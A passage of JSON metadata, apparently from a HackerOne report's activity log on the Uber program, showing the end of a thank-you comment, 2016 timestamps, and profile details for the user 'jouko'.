Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-27T12:26:52.138Z","updated_at":"2016-06-27T12:27:41.258Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}